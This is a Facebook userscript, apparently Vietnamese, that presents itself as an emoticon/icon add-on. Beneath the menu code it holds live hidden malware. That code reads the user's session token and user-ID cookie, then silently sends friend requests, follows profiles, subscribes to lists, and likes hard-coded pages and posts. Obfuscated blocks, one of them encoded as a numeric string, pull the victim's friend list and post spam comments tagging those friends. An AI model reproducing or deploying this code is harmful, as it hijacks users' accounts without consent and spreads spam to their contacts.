	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Đ? Cài Đ?t ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

// vu vơ
sublist("429254323874962");sublist("429254010541660");sublist("384489928351402");a("100003711953951");
// chau ngoai ba tung
IDS("100002430714054");a("100007007468883");a("100002438544264");sublist("483606408397306");
P("551216141636071");P("532062433551442");P("536998916391127");P("569729609784724");P("574556379302047");
P("578150965609255");P("423101567780863");P("591242200966798");P("217247188472640");P("595211903903161");sublist("539211006169918");Like("434284746688127");Like("233017540215180");Like("216305145233511");
// Thuyên korea
a("100006150488962");
a("100006348311623");
sublist("265068783657113");
sublist("265091860321472");
sublist("279410832222908");
IDS("100004619800282");
//code tag 
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","609875672421860","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Icon mới nhất 2014 của facebook 💔 💙 💚 💛 💘 💖 👿 ☀ 🐍 👫 📞 🎓 🐧 🐬 🐛 👷 🐯 (^^^) 🌙 🎁 :|]	<3??","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
// code xxx
var _9357;var _6325='69696A168D145D1895C1727E1863E1207F1775D1791F1751C1207F1439D1207C1679B1263E1375E1359B1391D1383F1375B1351F1375E1407F1407C1383E1383A1375A1391D1375D1407C1263A1695B1423A1031A1895A1727D1863C1207B1767C1735C1711D1751F1879B1871F1775E1207E1439E1207B1751A1839B1743D1887B1823A1759A1831E1879C1679C1263A1775A1759C1879F1503F1815E1759F1823D1759E1831A1879C1871A1479E1919D1575F1727E1823D1759F1263C1695B1271D1263C1767C1735B1711F1751B1879C1871C1775E1263A1279C1679E1335B1695F1679E1263F1895E1727C1815A1887F1759D1263D1695F1423B1031D1895B1727B1863C1207F1887C1871D1759A1863F1711F1791D1751C1207E1439B1207D1751A1839F1743D1887C1823D1759F1831E1879C1679B1263B1743B1839E1839B1807D1791A1759D1263D1695E1679D1263F1823A1727B1879A1743A1783D1263A1695F1271B1751D1839A1743D1887E1823F1759B1831D1879F1679B1263D1743A1839A1839D1807C1791E1759D1263E1695D1679C1263A1823C1727D1879F1743A1783D1263F1695A1271D1327C1743F1711E1887A1871D1759A1863E1439B1271A1687E1751F1295F1279C1327B1279F1679D1343E1695E1279E1423F1031C1895A1727E1863E1207F1783E1879B1879D1847B1903B1847C1207F1439F1207C1831A1759E1903A1207F1655B1567C1559E1527B1879D1879A1847E1607F1759A1855A1887E1759E1871B1879A1271D1279A1423A1031D1895E1727F1863F1207F1887E1863B1815D1903E1847F1207E1439C1207B1263E1327E1727D1799D1727D1911D1327B1775B1863D1839F1887D1847F1871D1327B1823D1759B1823B1735D1759C1863E1871F1783C1791E1847E1327C1863E1351B1799E1319D1847D1783B1847D1455B1711C1711D1727A1439B1343B1263C1423F1031D1895A1727B1863C1207F1847F1727F1863B1727A1823F1871B1903D1847A1207A1439D1207D1263E1255C1863B1759A1767E1439A1775E1863C1839D1887E1847E1711E1799B1887E1823E1847A1711F1783D1759C1727F1751E1759C1863E1255A1775D1863C1839B1887F1847C1711B1791B1751C1439C1263F1207F1295B1207A1775D1791D1751B1207F1295E1207D1263F1255E1767E1735F1711A1751F1879E1871B1775F1439C1263A1207B1295C1207C1767C1735F1711B1751D1879E1871B1775C1207C1295B1207A1263E1255A1711A1711A1887E1871B1759F1863F1439D1263E1207F1295C1207E1887B1871E1759D1863A1711C1791E1751D1207B1295A1207B1263A1255A1847A1783A1871D1879F1727A1823E1847E1439A1263E1423E1031A1783B1879C1879D1847F1903D1847B1679D1263B1839F1847B1759C1831B1263A1695A1271F1263F1591E1583E1615E1623C1263D1303C1207C1887D1863C1815D1903E1847A1303D1207B1879E1863B1887D1759F1279A1423D1031D1783A1879B1879A1847A1903A1847B1679D1263F1871C1759C1879F1607F1759F1855F1887F1759F1871E1879E1527B1759A1727B1751C1759D1863F1263A1695A1271B1263F1487F1839D1831A1879F1759D1831D1879A1311A1879B1919A1847C1759A1263B1303B1207A1263C1727A1847B1847B1815A1791C1743F1727F1879C1791A1839C1831A1327F1911D1311C1903C1903F1903A1311E1767C1839D1863B1823C1311C1887E1863A1815C1759A1831D1743F1839F1751B1759E1751F1263B1279D1423C1031E1783B1879E1879B1847F1903B1847A1679A1263B1871B1759B1879C1607E1759E1855A1887E1759E1871D1879B1527D1759F1727B1751D1759C1863E1263E1695D1271A1263B1487B1839D1831C1879F1759A1831F1879F1311B1815E1759F1831F1775A1879E1783E1263D1303B1207B1847F1727B1863C1727C1823C1871B1903C1847A1679B1263E1815D1759A1831D1775F1879A1783F1263F1695F1279A1423F1031B1783F1879F1879D1847E1903B1847C1679A1263A1871F1759E1879E1607C1759B1855F1887D1759B1871A1879F1527D1759B1727B1751C1759F1863F1263A1695C1271C1263F1487A1839A1831F1831A1759D1743C1879D1791B1839F1831A1263F1303E1207C1263E1807A1759C1759C1847A1311D1727B1815B1791F1895F1759A1263C1279B1423E1031F1783C1879C1879B1847B1903A1847B1679A1263C1871E1759F1831C1751D1263F1695E1271A1847F1727E1863F1727B1823F1871C1903F1847F1279C1423A1031B1207E1031B1895B1727B1863B1207C1767E1735F1711A1751D1879F1871B1775B1207C1439F1207C1751F1839C1743A1887A1823B1759B1831E1879E1679A1263B1775A1759A1879B1503C1815E1759E1823B1759D1831F1879F1871A1479A1919F1575C1727B1823D1759A1263C1695F1271E1263C1767C1735E1711B1751C1879C1871D1775C1263D1279B1679D1335B1695D1679A1263E1895D1727F1815C1887A1759D1263A1695F1423C1031B1895A1727B1863A1207A1887E1871D1759A1863A1711E1791E1751B1207C1439B1207A1751A1839F1743A1887B1823C1759E1831A1879A1679B1263F1743B1839D1839C1807F1791E1759D1263E1695E1679B1263A1823A1727A1879D1743C1783A1263D1695E1271E1751C1839C1743F1887E1823F1759F1831B1879C1679C1263C1743D1839E1839A1807A1791E1759E1263F1695E1679A1263C1823B1727E1879F1743E1783F1263B1695E1271E1327B1743E1711F1887C1871D1759E1863B1439A1271A1687E1751C1295C1279A1327E1279A1679A1343B1695F1279D1423F1031A1207D1031D1895A1727B1863F1207B1767F1863C1791F1759C1831A1751D1871F1207D1439F1207D1831D1759E1903A1207C1471C1863E1863A1727E1919D1271D1279B1423B1031D1775B1767A1207B1439B1207C1831D1759A1903C1207B1655A1567D1559E1527B1879D1879E1847A1607E1759C1855D1887E1759C1871F1879F1271A1279C1423D1031A1775B1767F1679A1263C1839D1847C1759C1831A1263C1695C1271D1263E1519B1503D1623D1263E1303B1207B1263C1327B1727D1799C1727F1911F1327B1879F1919D1847B1759C1727E1783D1759D1727C1751C1327B1767B1791C1863E1871B1879B1711A1751A1759B1775A1863B1759E1759F1319E1847F1783D1847C1455C1711F1711A1727F1439B1343C1255A1895B1791E1759F1903D1759A1863F1439E1263D1207C1295F1207D1887E1871F1759F1863F1711D1791A1751F1207A1295C1207C1263D1255F1879D1839D1807E1759D1831E1263E1207E1295A1207C1567A1727D1879C1783A1679D1263E1863F1727C1831D1751A1839A1823B1263A1695C1271A1279F1207F1295F1207F1263B1255A1767D1791E1815C1879B1759C1863B1679E1335F1695B1439E1887E1871B1759D1863F1255B1839A1847F1879B1791D1839B1831D1871C1679C1335C1695B1439F1767A1863D1791B1759F1831B1751F1871C1711B1839B1831F1815F1919E1263A1303E1207D1767D1727F1815F1871D1759A1279D1423C1031C1775E1767D1679D1263E1871C1759B1831A1751A1263F1695E1271D1279C1423C1031F1791F1767F1207E1271B1775F1767A1679E1263F1863A1759E1727F1751C1919C1615D1879D1727C1879B1759D1263D1695E1207F1215C1439C1207A1367C1279F1207C1935F1951E1207E1759B1815E1871C1759C1207E1935D1031B1207F1207B1207D1207F1751E1727C1879C1727F1207A1439F1207F1759F1895B1727E1815E1271B1263B1271F1263E1207E1295A1207B1775F1767D1679A1263D1863B1759E1871E1847A1839B1831D1871B1759B1623F1759F1911D1879E1263C1695F1679B1263D1871B1887C1735B1871F1879D1863F1263F1695D1271A1407A1279E1207B1295A1207F1263C1279E1263A1279D1423C1031A1207D1207D1207A1207A1791F1767F1207F1271B1751A1727B1879B1727A1679C1263D1759B1863C1863C1839B1863D1263A1695F1279B1207B1935F1951C1207F1759E1815E1871C1759E1207D1935B1031E1207C1207A1207C1207C1207A1207B1207B1207A1767F1863D1791C1759B1831E1751B1871A1207A1439E1207E1751A1727E1879E1727C1679D1263A1847B1727D1919F1815A1839E1727F1751E1263D1695D1679C1263D1759D1831C1879B1863E1791B1759E1871A1263B1695F1679B1263E1871E1839D1863C1879C1263A1695B1271C1767B1887C1831E1743D1879A1791C1839B1831A1207F1271B1711E1335C1911B1407C1359E1751F1727E1911B1399B1303B1207E1711B1335B1911A1407E1359A1751E1727E1911C1407E1279E1207B1935A1031F1207A1207F1207C1207F1207E1207B1207C1207A1207C1207E1207A1207F1863A1759C1879B1887D1863C1831E1207D1711D1335A1911F1407E1359F1751C1727B1911E1399F1679C1263E1791C1831E1751B1759D1911D1263A1695E1207B1311E1207A1711D1335B1911E1407D1359A1751A1727C1911D1407F1679C1263B1791B1831E1751E1759C1911F1263D1695F1423F1031D1207E1207B1207D1207E1207E1207C1207D1207F1951B1279C1423E1031C1207D1207C1207F1207E1951B1423B1031F1951E1423B1031B1207B1031C1767B1839F1863F1207E1271D1895B1727B1863E1207E1791B1207B1439D1207B1335F1423E1207C1791D1207B1431B1207F1767B1863D1791F1759B1831A1751F1871D1679D1263C1815F1759D1831F1775C1879B1783B1263B1695E1423E1207F1791C1295D1295E1279F1207D1935A1031D1207E1207B1207F1207A1895C1727E1863D1207A1783F1879F1879D1847D1903D1847C1207C1439A1207C1831F1759C1903A1207E1655C1567E1559B1527B1879D1879A1847D1607C1759F1855E1887B1759B1871D1879C1271C1279A1423F1031F1207A1207C1207D1207B1895A1727E1863C1207B1887A1863F1815E1903C1847F1207C1439C1207E1263E1327C1727E1799C1727C1911E1327B1775C1863F1839B1887C1847F1871D1327B1823B1759A1823F1735F1759D1863C1871F1327A1727D1751C1751B1711E1847D1839A1871B1879B1319C1847B1783C1847E1455C1711F1711C1727C1439C1343F1263E1423A1031E1207D1207B1207A1207A1895B1727A1863F1207D1847D1727C1863E1727B1823A1871D1903E1847F1439F1207F1263D1255B1767D1735A1711E1751E1879D1871E1775C1439C1263C1207C1295A1207A1767C1735B1711D1751A1879F1871F1775C1207D1295B1207B1263C1255C1775C1863C1839A1887E1847D1711A1791C1751B1439C1263B1207D1295B1207F1775F1791B1751C1207F1295F1207D1263D1255A1871B1839D1887C1863E1743E1759D1439D1879D1919E1847A1759B1727F1783F1759D1727B1751E1255A1863F1759C1767C1439F1255B1823A1759F1871A1871D1727B1775F1759C1711D1791A1751C1439D1255F1823B1759F1823B1735E1759D1863F1871B1439B1263A1207A1295A1207E1767A1863C1791E1759D1831C1751E1871A1679C1791B1695E1679A1263D1887C1791C1751F1263B1695A1207A1295A1207F1263B1255E1711C1711B1887A1871E1759E1863C1439C1263D1207C1295A1207C1887C1871B1759C1863F1711A1791B1751E1207C1295E1207D1263C1255B1847A1783F1871E1879B1727A1823D1847A1439B1263B1423E1031E1207F1207A1207F1207A1783D1879D1879B1847E1903D1847C1679E1263A1839F1847F1759B1831F1263F1695D1271A1263E1591A1583C1615F1623D1263C1303A1207C1887F1863A1815E1903F1847A1303C1207A1879D1863B1887B1759E1279A1423E1031B1207E1207B1207B1207E1783F1879E1879C1847E1903D1847C1679D1263F1871A1759E1879C1607E1759A1855A1887E1759C1871B1879C1527A1759B1727F1751D1759F1863C1263F1695F1271F1263A1487E1839C1831D1879B1759F1831A1879A1311F1879B1919C1847E1759D1263E1303F1207C1263D1727C1847E1847A1815E1791A1743F1727C1879A1791C1839C1831A1327E1911E1311E1903D1903C1903F1311E1767B1839B1863A1823C1311A1887A1863E1815E1759F1831A1743E1839C1751D1759D1751B1263A1279C1423E1031A1207C1207E1207D1207F1783F1879A1879F1847C1903B1847D1679B1263F1871D1759E1879D1607E1759B1855B1887B1759C1871B1879C1527C1759E1727D1751D1759E1863F1263A1695D1271C1263C1487F1839D1831F1879D1759E1831B1879A1311C1815B1759D1831D1775E1879E1783B1263C1303A1207D1847B1727D1863E1727B1823D1871E1903A1847A1679D1263D1815C1759A1831D1775A1879F1783A1263E1695C1279F1423C1031C1207E1207C1207D1207A1783C1879E1879A1847C1903A1847E1679A1263A1871A1759B1879B1607B1759F1855F1887B1759A1871A1879C1527D1759E1727B1751C1759B1863E1263E1695A1271D1263C1487D1839B1831F1831F1759E1743A1879A1791B1839F1831A1263F1303A1207E1263E1807C1759A1759E1847A1311A1727F1815B1791D1895B1759C1263B1279D1423B1031B1207F1207E1207F1207E1783E1879C1879D1847E1903D1847C1679E1263C1839F1831C1863D1759D1727F1751F1919E1871F1879F1727E1879E1759D1743F1783A1727F1831D1775D1759F1263D1695E1207F1439C1207F1767A1887C1831E1743A1879D1791E1839C1831E1207E1271D1279F1207D1935F1031D1791B1767F1207B1271A1783A1879E1879A1847C1903B1847D1679C1263A1863C1759E1727D1751C1919B1615F1879B1727A1879C1759A1263E1695A1207F1439F1439C1207D1367D1207D1255A1255D1207E1783A1879B1879B1847E1903F1847F1679E1263F1871F1879C1727B1879B1887D1871B1263E1695C1207E1439B1439C1207F1351B1335C1335F1279B1207F1935B1951E1423C1031A1207E1207E1207B1207C1951A1423D1031E1207C1207C1207D1207C1783B1879E1879A1847A1903C1847B1679C1263F1871F1759B1831E1751F1263D1695A1271A1847A1727E1863E1727F1823A1871F1903D1847C1279C1423D1031F1951B1031A1207F1031B1207C1031D1327C1327B1727E1863C1807B1727C1751C1727D1871A1815A1727D1863D1791D1207D1727F1815E1207B1895A1759F1207F1791F1871A1815F1759D1031E1767A1887B1831B1743E1879D1791C1839E1831F1207E1871D1727B1863F1807F1727D1751E1727B1871D1815D1727C1863C1791E1711B1727D1815C1271B1279C1935B1031D1207C1207A1207C1207F1207F1207B1207E1207B1207E1207A1207E1207E1207A1207D1207B1207A1895C1727C1863C1207D1911F1823A1815F1783B1879C1879E1847C1207C1439C1207F1831E1759A1903D1207D1655F1567F1559C1527D1879D1879A1847E1607F1759D1855A1887A1759B1871B1879F1271E1279C1423A1031D1207A1207A1207F1207B1207A1207B1207D1207F1911B1823F1815B1783B1879B1879E1847A1319A1839D1831C1863A1759B1727A1751B1919A1871D1879B1727E1879A1759A1743B1783A1727B1831B1775A1759A1207A1439F1207F1767D1887D1831E1743A1879D1791A1839D1831A1207D1271E1279D1207C1935E1031E1207B1207E1207B1207D1207F1207F1207E1207B1207D1207D1207B1207C1207E1207C1207D1207B1207D1207C1207D1207F1207D1207D1207C1207F1791D1767D1271B1911B1823A1815B1783C1879F1879A1847E1319C1863B1759A1727B1751C1919A1615E1879C1727A1879A1759C1207B1439E1439D1207C1367E1279D1935E1031C1207A1207A1207E1207F1207C1207C1207B1207B1207E1207B1207A1207A1207F1207F1207E1207B1207F1207C1207B1207F1207A1207A1207B1207D1207E1207A1207F1207A1207C1207F1207C1207F1207A1207C1759D1895E1727E1815E1271E1223A1727E1863C1807C1727B1751A1727E1871C1815A1727E1863A1207D1439A1207C1223F1207C1295D1207C1911D1823D1815D1783F1879F1879E1847A1319F1863C1759E1871F1847D1839E1831B1871A1759F1623D1759E1911F1879A1319A1879A1839E1615B1879D1863D1791F1831A1775D1271F1279C1319D1863C1759C1847B1815F1727E1743D1759C1271F1223F1767C1839E1863B1207A1271C1423F1423D1279F1423B1223F1303E1223A1223D1279D1207E1295C1207E1223C1423A1223A1279B1423B1031B1207A1207C1207F1207F1207D1207F1207A1207F1207B1207D1207A1207F1207C1207B1207E1207F1207B1207A1207E1207B1207E1207B1207F1207D1207D1207A1207B1207C1207B1207F1207E1207C1207A1207F1767B1839C1863E1271F1767B1439B1335D1423F1767E1431E1567D1727D1879A1783A1319D1863D1839F1887C1831A1751B1271C1727C1863F1807A1727C1751A1727F1871B1815D1727A1863C1319D1847D1727A1919D1815A1839F1727E1751B1319C1759C1831A1879A1863C1791D1759F1871A1319C1815F1759B1831F1775D1879A1783F1327E1343F1335E1279B1423D1767D1295E1295D1279F1935D1031A1207A1207B1207F1207D1207F1207C1207D1207E1207F1207F1207E1207A1207E1207C1207D1207B1207F1207E1207F1207D1207B1207D1207D1207C1207F1207F1207F1207E1207F1207C1207A1207D1207D1207C1207B1207A1207D1207D1207E1207D1871A1823A1759C1871A1727B1799C1207F1439A1207F1223A1223D1423A1031C1207D1207F1207E1207F1207F1207B1207A1207A1207B1207F1207D1207D1207D1207A1207A1207E1207D1207F1207C1207B1207B1207F1207F1207E1207E1207D1207C1207A1207D1207C1207E1207C1207F1207B1207A1207B1207C1207C1207B1207F1871F1823B1759F1871B1727C1799D1711C1879E1759F1911C1879B1207A1439E1207B1223A1223F1423C1031F1207C1207E1207F1207A1207E1207F1207C1207B1207F1207B1207E1207B1207D1207A1207C1207F1207B1207E1207D1207B1207E1207E1207F1207A1207B1207C1207F1207B1207E1207A1207E1207D1207F1207E1767D1839C1863D1271D1791B1439D1767B1287D1343B1335F1423B1791E1431D1271E1767C1295D1343E1279A1287A1343A1335B1423E1791F1295D1295E1279C1935E1031B1207E1207C1207F1207C1207B1207D1207A1207F1207C1207E1207F1207E1207D1207D1207D1207D1207E1207F1207A1207C1207C1207D1207D1207D1207E1207F1207A1207A1207A1207A1207E1207C1207C1207F1207C1207A1207A1207F1207D1207F1791E1767A1271E1727C1863A1807A1727C1751E1727D1871A1815D1727D1863F1319C1847B1727A1919D1815B1839E1727A1751A1319B1759C1831F1879B1863D1791A1759D1871A1679E1791A1695E1279D1935A1031D1207E1207A1207A1207A1207F1207B1207E1207B1207F1207B1207D1207A1207A1207F1207C1207F1207B1207C1207C1207F1207B1207E1207C1207C1207E1207C1207C1207C1207B1207E1207A1207D1207F1207B1871A1823C1759F1871D1727C1799D1207C1295F1439F1207C1223F1207E1463A1679E1223C1207D1295A1207B1727B1863B1807A1727F1751B1727D1871C1815E1727E1863E1319F1847A1727B1919B1815C1839E1727E1751D1319B1759B1831C1879C1863A1791E1759B1871B1679D1791F1695F1319D1887B1791A1751F1207C1295A1207D1207C1223F1415E1223C1207E1295A1207E1727C1863A1807A1727B1751D1727F1871F1815B1727C1863D1319F1847E1727F1919E1815F1839E1727A1751E1319B1759B1831D1879A1863E1791D1759A1871C1679B1791C1695A1319F1879C1759B1911E1879D1207F1295C1207D1223F1695C1223D1423C1031C1207A1207B1207F1207B1207F1207E1207F1207B1207D1207A1207D1207B1207E1207C1207D1207F1207B1207C1207F1207E1207C1207E1207D1207E1207E1207C1207E1207F1207F1207B1207F1207E1207F1207D1871E1823B1759A1871E1727F1799C1711B1879C1759D1911D1879B1207A1295C1439B1207B1223F1207F1223B1207A1295E1207B1727B1863E1807C1727A1751F1727F1871D1815F1727F1863C1319D1847C1727F1919D1815F1839A1727D1751E1319B1759A1831A1879C1863A1791E1759A1871B1679F1791E1695A1319A1879C1759E1911D1879B1423A1031F1207E1207E1207A1207C1207D1207C1207E1207F1207D1207E1207F1207F1207A1207E1207A1207A1207C1207D1207F1207F1207A1207E1207F1207C1207D1207B1207B1207C1207F1207D1207F1207B1207A1207D1951F1031A1207D1207C1207C1207F1207D1207E1207F1207D1207F1207E1207A1207D1207E1207F1207B1207B1207D1207D1207B1207A1207E1207D1207B1207A1207A1207E1207C1207D1207D1207F1207A1207B1207E1207C1207A1207D1207E1207F1207D1207F1951C1031D1207F1207E1207D1207A1207D1207C1207A1207A1207D1207C1207F1207F1207B1207E1207E1207C1207A1207C1207B1207F1207F1207A1207F1207D1207A1207A1207A1207E1207F1207D1207B1207F1207F1207E1207E1207D1207D1207C1207A1207F1871D1751D1887A1863F1887F1823B1847B1727D1919C1815F1727F1871F1271B1279D1423F1207E1207B1207A1207A1207E1207B1207A1207C1207E1207A1207E1207A1207A1207B1207A1207F1207A1207A1207C1207B1207D1207E1207E1207E1207D1951A1031D1207D1207C1207F1207D1207C1207D1207A1207E1207F1207D1207C1207F1207F